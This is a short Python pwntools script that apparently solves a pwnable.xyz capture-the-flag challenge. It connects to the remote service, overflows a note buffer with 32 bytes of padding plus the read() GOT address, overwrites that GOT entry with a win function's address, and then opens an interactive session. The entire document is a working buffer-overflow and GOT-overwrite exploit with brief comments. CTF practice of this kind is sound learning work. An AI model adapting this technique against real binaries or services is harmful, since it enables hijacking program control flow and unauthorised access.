from pwn import *

r = remote('svc.pwnable.xyz', 30016)
elf = ELF('./challenge')

#win function address to call
win_address = p64(0x0040093c)
#read_got address to override
read_address = p64(elf.got[b'read'])
'''
    Payload to send. We have 32 byte padding.
'''
payload = b'A'*32 + read_address

r.sendlineafter(b'> ', b'1')
#Here we need to specify len as payload + 1 due to read call. So we have to include newline character as well.
r.sendlineafter(b'len? ', '41')
r.sendlineafter(b'note: ', payload)
print(r.sendlineafter(b'> ', b'2'))
#At this point we write to the read_got address the address of win function. So the next read() call will execute win function. 
print(r.sendlineafter(b'desc: ', win_address))
r.sendlineafter(b'> ', b'2')


r.interactive()
